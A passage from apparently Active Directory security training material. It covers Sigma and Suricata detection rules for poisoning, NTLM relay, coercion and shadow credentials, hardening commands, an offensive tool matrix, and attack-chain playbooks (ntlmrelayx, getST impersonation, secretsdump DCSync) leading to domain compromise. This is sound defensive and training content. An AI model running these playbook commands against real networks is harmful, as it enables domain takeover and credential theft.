id: b4c6d0e8-1f2a-3b4c-5d6e-7f8a9b0c1d2e
status: experimental
description: Detects modifications to the msDS-KeyCredentialLink attribute on AD objects, indicating potential shadow credentials attack.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'msDS-KeyCredentialLink'
  condition: selection
falsepositives:
  - Windows Hello for Business enrollment
  - Azure AD Connect provisioning
level: high
tags:
  - attack.t1556.006
  - attack.persistence
```

#### Kerberos Relay / Delegation Detection

```yaml
title: Suspicious S4U2Self Ticket Request for High-Privilege User
id: c5d7e1f9-2a3b-4c5d-6e7f-8a9b0c1d2e3f
status: experimental
description: Detects S4U2Self ticket requests impersonating high-privilege accounts, indicating potential constrained delegation or RBCD abuse.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TransitedServices: '*'
    TargetUserName|endswith: '$'
    ServiceName|contains:
      - 'Administrator'
      - 'Domain Admins'
  condition: selection
falsepositives:
  - Legitimate constrained delegation for web applications
  - Service accounts configured for protocol transition
level: high
tags:
  - attack.t1550.003
  - attack.lateral_movement
```

### 7.2 Suricata Rules

```yaml
# LLMNR Poisoning Detection
alert udp any any -> any 5355 (msg:"ET POLICY LLMNR Response - Potential Poisoning"; content:"|00 00 80 00|"; offset:2; depth:4; threshold:type both, track by_src, count 5, seconds 60; classtype:policy-violation; sid:2100001; rev:1;)

# NBT-NS Poisoning Detection
alert udp any 137 -> any any (msg:"ET POLICY Multiple NBT-NS Responses - Potential Poisoning"; content:"|00 00 00 00 00|"; offset:2; depth:5; threshold:type both, track by_src, count 10, seconds 60; classtype:policy-violation; sid:2100002; rev:1;)

# DHCPv6 Rogue Server Detection
alert udp any 547 -> any 546 (msg:"ET POLICY Rogue DHCPv6 Server - Potential mitm6 Attack"; content:"|02|"; offset:0; depth:1; threshold:type both, track by_src, count 3, seconds 120; classtype:policy-violation; sid:2100003; rev:1;)

# Suspicious SMB Connection After LLMNR Response
alert tcp any any -> any 445 (msg:"ET EXPLOIT SMB Connection Following LLMNR Response"; flow:to_server,established; content:"|ff 53 4d 42|"; offset:4; depth:4; threshold:type both, track by_dst, count 5, seconds 30; classtype:attempted-user; sid:2100004; rev:1;)

# EFS RPC Coercion (PetitPotam)
alert tcp any any -> any 445 (msg:"ET EXPLOIT Possible PetitPotam EFS RPC Coercion"; flow:to_server,established; content:"|c6 81 d4 88 d8 50 11 d0 8c 52 00 c0 4f d9 0f 7e|"; classtype:attempted-admin; sid:2100005; rev:1;)

# Print Spooler Coercion (PrinterBug)
alert tcp any any -> any 445 (msg:"ET EXPLOIT Possible PrinterBug Spooler RPC Coercion"; flow:to_server,established; content:"|01 00 00 00|"; content:"spoolss"; nocase; classtype:attempted-admin; sid:2100006; rev:1;)

# NTLM Relay to ADCS Web Enrollment
alert tcp any any -> any 80 (msg:"ET EXPLOIT NTLM Relay to ADCS HTTP Enrollment"; flow:to_server,established; content:"POST"; http_method; content:"/certsrv/certfnsh.asp"; http_uri; content:"NTLMSSP"; classtype:attempted-admin; sid:2100007; rev:1;)

# IPv6 Router Advertisement Flood (mitm6/Inveigh)
alert icmp6 any any -> ff02::1 any (msg:"ET POLICY Excessive IPv6 Router Advertisements"; icmp_type:134; threshold:type both, track by_src, count 10, seconds 60; classtype:policy-violation; sid:2100008; rev:1;)

# mDNS Poisoning Detection
alert udp any any -> 224.0.0.251 5353 (msg:"ET POLICY mDNS Response from Non-Standard Source"; threshold:type both, track by_src, count 20, seconds 60; classtype:policy-violation; sid:2100009; rev:1;)
```

### 7.3 Windows Event Log Detection Points

| Event ID | Log Source | Detection |
|----------|-----------|-----------|
| 4768 | Security | Kerberos TGT request — baseline and alert on anomalies |
| 4769 | Security | Kerberos TGS request — watch for S4U, unusual SPNs |
| 5136 | Security | AD object modification — `msDS-KeyCredentialLink` changes |
| 5145 | Security | Network share access — `lsarpc`, `efsrpc`, `spoolss` pipe access |
| 4624 | Security | Logon events — Type 3 from unexpected sources |
| 8222 | ADCS | Certificate request — machine account requesting user templates |
| 4886 | Security | Certificate Services received certificate request |
| 4887 | Security | Certificate Services approved and issued certificate |

### 7.4 Hardening Recommendations

#### Disable Poisoning Vectors

```powershell
# Disable LLMNR (GPO: Computer Configuration > Administrative Templates > Network > DNS Client)
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0 -Type DWord

# Disable NBT-NS (per adapter — must be done on all adapters)
# Network Adapter Properties > IPv4 > Advanced > WINS > Disable NetBIOS over TCP/IP

# Disable WPAD
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc" -Name "Start" -Value 4

# Disable IPv6 (nuclear option — not always recommended)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" -Name "DisabledComponents" -Value 0xFF
```

#### Enforce Signing and EPA

```powershell
# Require SMB signing (GPO)
# Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
# "Microsoft network server: Digitally sign communications (always)" = Enabled

# Require LDAP signing
# Default Domain Controllers Policy > Computer Configuration > Windows Settings > Security Settings
# "Domain controller: LDAP server signing requirements" = Require signing

# Enable EPA on ADCS
# IIS Manager > CA Website > Authentication > Windows Authentication > Advanced Settings
# Extended Protection = Required
```

#### Mitigate Coercion

```powershell
# Disable Print Spooler on DCs (critical — DCs should not run Print Spooler)
Stop-Service Spooler
Set-Service Spooler -StartupType Disabled

# Disable File Server VSS Agent Service (mitigates ShadowCoerce)
Stop-Service INTEGRITYCHECK
Set-Service "File Server VSS Agent Service" -StartupType Disabled

# RPC Filters (block PetitPotam via netsh)
netsh rpc filter add rule layer=um actiontype=block filterkey=<GUID>
netsh rpc filter add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
netsh rpc filter add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
```

#### ADCS Hardening

- Remove HTTP enrollment endpoints (enforce HTTPS with EPA)
- Restrict certificate template enrollment permissions
- Disable EDITF_ATTRIBUTESUBJECTALTNAME2 flag
- Require CA manager approval for sensitive templates
- Enable certificate mapping validation (StrongCertificateBindingEnforcement = 2)
- Audit all certificate issuance (Event IDs 4886, 4887)

---

## 8. Tool Reference Matrix

### 8.1 Poisoning & Interception Tools

| Tool | Language | Protocols | Key Capability |
|------|----------|-----------|---------------|
| [Responder](https://github.com/lgandx/Responder) | Python | LLMNR, NBNS, mDNS, DHCPv6, WPAD | Multi-protocol credential capture (17+ protocols) |
| [Inveigh](https://github.com/Kevin-Robertson/Inveigh) | C#/.NET | LLMNR, NBNS, mDNS, DNS, DHCPv6, ICMPv6 | Windows-native, packet-sniffing mode bypasses port conflicts |
| [mitm6](https://github.com/fox-it/mitm6) | Python | DHCPv6, DNS | Purpose-built DHCPv6 DNS takeover |
| [Bettercap](https://github.com/bettercap/bettercap) | Go | ARP, DNS, NDP, DHCPv6, 802.11, BLE, HID | Full MITM framework with web UI |

### 8.2 Relay Tools

| Tool | Language | Relay Targets | Key Capability |
|------|----------|---------------|---------------|
| [ntlmrelayx](https://github.com/SecureAuthCorp/impacket) | Python | SMB, LDAP, HTTP, MSSQL, ADCS | Swiss-army relay with RBCD, shadow creds, SOCKS |
| [krbrelayx](https://github.com/dirkjanm/krbrelayx) | Python | SMB, LDAP | Kerberos relay + unconstrained delegation abuse |

### 8.3 Coercion Tools

| Tool | Protocols | Auth Required | Key Feature |
|------|-----------|---------------|-------------|
| [Coercer](https://github.com/p0dalirius/Coercer) | MS-EFSR, MS-RPRN, MS-DFSNM, MS-FSRVP, MS-EVEN | Varies | Unified framework, 12+ methods, scan mode |
| [PetitPotam](https://github.com/topotam/PetitPotam) | MS-EFSRPC | No (pre-patch) | EFS-based coercion, unauthenticated variant |
| [printerbug.py](https://github.com/dirkjanm/krbrelayx) | MS-RPRN | Yes | Print Spooler callback trigger |

### 8.4 AD Exploitation Tools

| Tool | Language | Key Capability |
|------|----------|---------------|
| [pywhisker](https://github.com/ShutdownRepo/pywhisker) | Python | Shadow credentials (msDS-KeyCredentialLink manipulation) |
| [PKINITtools](https://github.com/dirkjanm/PKINITtools) | Python | PKINIT auth, UnPAC-the-hash, S4U2Self |
| [Certipy](https://github.com/ly4k/Certipy) | Python | AD CS exploitation (ESC1-ESC16), cert forging |
| [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) | C#/Python | Certificate auth via Schannel (bypasses PKINIT) |
| [Powermad](https://github.com/Kevin-Robertson/Powermad) | PowerShell | MachineAccountQuota abuse, ADIDNS manipulation |
| [bloodyAD](https://github.com/CravateRouge/bloodyAD) | Python | LDAP-based AD privesc (RBCD, shadow creds, ACLs) |
| [Impacket](https://github.com/SecureAuthCorp/impacket) | Python | Protocol implementations (SMB, Kerberos, MSRPC, LDAP) |

### 8.5 Defensive Tools

| Tool | Key Capability |
|------|---------------|
| [BlueHound](https://github.com/zeronetworks/BlueHound) | Attack path visualization, risk scoring, combines AD + vulnerability data |
| SharpHound / BloodHound | AD relationship enumeration and graph analysis |

### 8.6 ATT&CK Mapping

| Technique | ATT&CK ID | Tools |
|-----------|-----------|-------|
| LLMNR/NBT-NS Poisoning | T1557.001 | Responder, Inveigh, Bettercap |
| DHCPv6 Spoofing | T1557.003 | mitm6, Responder, Inveigh |
| ARP Spoofing | T1557.002 | Bettercap |
| NTLM Relay | T1557.001 | ntlmrelayx |
| Forced Authentication | T1187 | PetitPotam, Coercer, printerbug.py |
| Steal/Forge Kerberos Tickets | T1558 | krbrelayx, getST.py, getTGT.py |
| Kerberos Delegation Abuse | T1550.003 | getST.py, krbrelayx |
| Certificate Theft | T1649 | Certipy, ntlmrelayx (ADCS) |
| Shadow Credentials | T1556.006 | pywhisker, bloodyAD, Certipy |
| Modify Authentication Process | T1556 | pywhisker, PassTheCert |
| Account Manipulation | T1098 | Powermad, bloodyAD |

---

## Appendix A: Common Attack Chain Playbooks

### A.1 Zero-to-Domain-Admin via Name Poisoning

```
[Network Access] → Responder (LLMNR/NBNS) → Capture NetNTLMv2
→ hashcat -m 5600 → Cleartext password → BloodHound enumeration
→ Identify path to DA → Lateral movement
```

### A.2 Zero-to-Domain-Admin via Relay (No Cracking)

```
[Network Access] → Responder/mitm6 (poisoning)
→ ntlmrelayx -t ldap://dc01 --delegate-access
→ Machine account created + RBCD configured
→ getST.py -impersonate Administrator
→ secretsdump.py → Full domain compromise
```

### A.3 Zero-to-Domain-Admin via ADCS Relay

```
[Network Access] → PetitPotam (coerce DC)
→ ntlmrelayx -t http://ca/certsrv/certfnsh.asp --adcs --template DomainController
→ Certificate for DC$ → certipy auth → NT hash
→ secretsdump.py (DCSync) → Full domain compromise
```

### A.4 Shadow Credentials Persistence

```
[Write access to target] → pywhisker --action add
→ gettgtpkinit.py (PKINIT with planted cert) → TGT
→ getnthash.py (UnPAC-the-hash) → NT hash
→ Persistent access (certificate valid 40+ years)
```

### A.5 Kerberos Relay via DHCPv6

```
[Network Access] → mitm6 -d domain.local --relay
→ DNS control established → krbrelayx.py
→ Victim sends Kerberos auth to spoofed DNS target
→ TGS intercepted and relayed → Service access
```

---

## Appendix B: Detection Coverage Matrix

| Attack | Network IDS | Windows Events | LDAP Audit | ADCS Audit |
|--------|-------------|---------------|------------|------------|
| LLMNR Poisoning | Suricata rule | N/A | N/A | N/A |
| NBNS Poisoning | Suricata rule | N/A | N/A | N/A |
| DHCPv6 Spoofing | Suricata rule | DHCPv6 logs | N/A | N/A |
| NTLM Relay | SMB signing alerts | 4624 (Type 3) | N/A | N/A |
| ADCS Relay (ESC8) | HTTP NTLM rule | IIS logs | N/A | 4886, 4887 |
| PetitPotam | EFS RPC IDS rule | 5145 (pipe access) | N/A | N/A |
| PrinterBug | Spooler RPC rule | 5145 (pipe access) | N/A | N/A |
| Shadow Credentials | N/A | 5136 | msDS-KeyCredentialLink | N/A |
| Kerberos Relay | N/A | 4768, 4769 | N/A | N/A |
| RBCD Abuse | N/A | 4769 (S4U) | msDS-AllowedToActOnBehalfOfOtherIdentity | N/A |
| Golden Certificate | N/A | N/A | N/A | 4886, 4887 |

---

*Training material compiled from open-source tool documentation and public security research. All techniques described assume authorized engagement context per rules of engagement.*
